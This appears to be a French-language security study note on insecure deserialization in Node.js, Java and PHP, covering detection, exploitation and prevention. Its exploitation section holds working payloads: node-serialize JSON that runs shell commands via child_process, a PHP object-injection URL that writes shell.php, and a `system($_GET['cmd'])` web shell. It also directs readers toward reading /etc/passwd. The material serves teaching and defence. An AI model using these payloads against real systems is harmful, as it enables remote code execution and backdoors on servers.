# Failles web - Déserialization

## Description
La sérialisation consiste à stocker un objet sous la forme d'un flux d'octets à l'aide de XML ou JSON ou d'éléments spécifique au langage, dans le but de le faire transiter sur le réseau. Les attaques de ce type gagne en populartiré ces dernieres années. La difficulté de ces attaques reposent essentiellement sur la connaissance du code et donc le reverse engineering.

En Java il est possble de recourir à la désrialisaition avec les objets suivants pour :
* **SQLConnection** pour accéder à une base de données
* **User** pour accéder à une base de données via des requêtes SQL spécifiques
* **LogFile** pour récupérer les données précédemment enregistrées pour un utilisateur

En fonction des langages on peut retrouver des dénominations spécifiques:
* Python : pickling / unpickling
* PHP : serializing / deserializing
* Ruby : marshalling / unmarshalling

Par exemple en php l'utilisation de la déserialisation va fonctionner ainsi. Le code

    $my_string = serialize('<?php phpinfo(); ?>');
va donnée en sortie:

    s:19:"<?php phpinfo(); ?>"; 
où 19 représente le nombre de caractère de la chaîne qui suit.

## Détection
Avec NodeJS, le module `serialize.js` contient une vulnérabilité à travers l'utilisation de la fonction `eval()` qui va interpréter du code.  

Avec Java, la fonction `readObject` est utilisée afin de déserialisé. L'identifier permettrait d'être sur la piste d'une vulnérabilité.

Avec PHP, ce sont les fonctions `serialize()` et `unserialize()` qui traduise l'utilisation de ce mécanisme.

Dans une requête, au niveau de l'URL on peut trouver quelquechose de cette forme:

    data=O:6:"object":3:{s:5:"file1";s:6:"file12";s:4:"data";s:4:"fil3";}
Qui contient le nom de la classe, le nombre de variable et les noms de variable. Le nombre avant le nom de la variable correspond à la longueur de la chaîne de caractère représentant le nom.

## Intention
Cette attaque va être en générale utilisé pour 
* une attaque DoS, ou pour 
* une injection de code
* une injection de commandes
* l'installation d'une backdoor
 
Ces injections de code peuvent par exemple permettre de récupérer des fichiers sensibles.

## Exploitation

### Exploitation de serialize.js
L'object JSON:

    {"MyObj":"_$$ND_FUNC$$_function(){require('child_process').exec('ls',function(error, stdout, stderr) {console.log(stdout)});}()"}

permettra à travers l'exécution de `eval()` dans la fonction `unserialize` d'exécuter la commande `ls` donc d'exécuter du code distant.

### Exploitation d'une faille identifiée et accès au filesystem
La première étape est de l'identifier. Par exemple, admettons que l'on trouve un cookie dont le contenu est encodé en base64 et dont on identifie qu'il sera déserialisé. La déserialisation se passant à travers le module `node-serialize` qui va évaluer l'expression de la fonction passé.

Il nous est possible de passer un objet JSON comme payload qui sera ensuite encodé en base64 pour reprendre le fonctionnement du cookie:

    {"MyObj":"_$$ND_FUNC$$_function(){require('child_process').exec('echo hello >> /opt/web/webapp/public/file.txt',function(error, stdout, stderr) {console.log(stdout)});}()"}
Il ne reste plus qu'à injecter le payload à la place du cookie avec Burp en interceptant la requête pour accéder à `/` (le home, qui correspond également au dossier public accessible depuis internet). Nous allons avoir accès au fichier `file.txt`.
A partir de là, puisque nous avons identifé un accès au système de fichier, il ne reste plus qu'à modifier la commande pour accéder à des fichiers sensibles tels que `/etc/passwd` par exemple.

### Exploiter la protection anti-CSRF par jeton en Java
La protection sur un jeton sous forme de paramètre `csrfValue` qui sera récupéré dans la requête sous forme de String avant d'être converti en tableau d'octets puis lu par la fonction `readObject`:

    String parameterValue = request.getParameter("csrfValue");
    ...
    byte[] csrfBytes =DatatypeConverter.parseBase64Binary(parameterValue);
    ByteArrayInputStream bis = new ByteArrayInputStream(csrfBytes);
    ObjectInput in = new ObjectInputStream(bis);
    csrfToken = (CSRF)in.readObject();

La vulnérabilité ici est comme bien souvent l'utilisation d'une fonction potentiellement vulnérable sans protection sur l'entrée utilisateur (le paramètre `csrfValue`).

Si par exemple la classe `CSRF` qui caste l'instance utilisant appelant la méthode `readObject` exécutait du code:

    public class CSRF implements Serializable {
        …
        public String command = "cat /etc/passwd";
        …
        public void execCommand(){
            … 
            Runtime.getRuntime().exec(this.command);
            …
        private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException {
            …
            this.execCommand();
        }
    } 
Alors nous aurions réussi notre injection de code arbitraire sur le serveur. Il faut savoir que 
* `ObjectInputStream` ne vérifie pas quelle classe est désérialisée
* Il n’y a pas de liste blanche ou noire de classes autorisées à être désérialisées

Les classes et fonctions disponible dans le périmètre d'exécution d'une application sont appelés gadget. Une attaque consisterait à envoyer un premier gadget (kick-off gadget) qui entraîne une suite d'apel de gagdet jusqu'au sink gadget, celui qui va exécuter du code arbitraire, préalablement identifié par l'attaquant. On peut trouver des sink gadget dans les librairies standard:
* Spring AOP
* Commons-ﬁleupload
* Groovy
* Apache Commons-Collections
* Spring Beans
* Serial DoS
* SpringTx
* JDK7
* Beanutils
* Hibernate, MyFaces, C3P0, net.sf.json, ROME
* Beanshell
* JDK7 Rhino

Il est possible de trouver des outils pour la génération de charges afin d'exploiter les gadgets [ici](https://github.com/frohoff/ysoserial.).

### Exploitation en PHP
PHP propose des fonctions propre à la serialisation:
* __construct()
* __sleep()
* __toString()

et à la déserialisation:
* __destruct()
* __wakeup()
* __toString()

L'exemple dispo [ici](https://www.exit.wtf/vrd/2019/04/04/Insecure_Deserialization.html) se base sur la classe suivante:
    
    <?php
        class attack
        {
            public function __construct($file, $data)
            {
                $this->file = $file; // nom du ficher
                $this->data = $data; // contenu qui ira dans le fichier
            }

            function __destruct()
            {
                file_put_contents($this->file, $this->data);
            }
        }
        $data = unserialize($_GET['data']); //Get parameter for ease of use, however, this can be a post request as well
    ?>

La fonction `__destruct()` appellée lors de la déserialisation va remplir le fichier `this->file` avec le contenu `$this->data`.

Si on consifère le payload suivant:

    data=O:6:"attack":3:{s:4:"file";s:9:"shell.php";s:4:"data";s:19:"<?php phpinfo(); ?>";}
Il représente:
* **data** correspond à `$_GET['data']`
* **O:6:"attack"** est le nom de la classe utilisée précédé par le nombre de caractères du nom de la classe
* **:3:** est le nombre de paramètre de l'objet : `$file`, `$data` et `;` de fin de ligne

Il est indispensable d'avoir un nombre de paramètre de 3 ici, le `;` compte, sinon l'exploit ne fonctionnera pas. 
Puis nous avons la composition de l'objet:
* **s:4:"file"** premier paramètre
* **s:9:"shell.php"** valeur du premier paramètre, donc le nom du fichier
* **s:4:"data"** second paramètre
* **s:19:"<?php phpinfo(); ?>"** valeur du second paramètre, ici le contenu est le script php appelant `phpinfo` qui sera donc envoyé dans `data` (et donc dans file)

Le nombre de caractère est primordial pour faire fonctionner l'exploit. La précision est la clé.

On lance l'exploit:

    http://domain.com/deserialization_attack.php?data=O:6:"attack":3:{s:4:"file";s:9:"shell.php";s:4:"data";s:19:"<?php phpinfo(); ?>";}
On peut observer la création sur le server dans la partie accessible du fichier `shell.php` qui si il est appelé, affichera le résultat de la fonction `phpinfo()` et donc la configuration du serveur. On peut facilement imaginer qu'en injectant à la place ce code `<?php system($_GET['cmd']); ?>` nous avons possibilité de mettre en place une injection de commande, ou installer une backdoor.

## Prévention
Pour un flux dont nous maîtrisons le contenu, passer par un format d'échange type JSON, en php par exemple avec les fonctions `json_decode()` et `json_encode()`.

Si l'entrée peut venir de l'extérieur, penser à contrôler l'intégrité des données. En php par exemple avec la fonction `hash_hmac()`.

## Liens
* https://www.securityinsider-wavestone.com/2019/07/techniques-outils-deserialisation-java.html
* https://riptutorial.com/fr/php/example/14674/problemes-de-securite-avec-unserialize
* https://www.exit.wtf/vrd/2019/04/04/Insecure_Deserialization.html
* https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Deserialization_Cheat_Sheet.md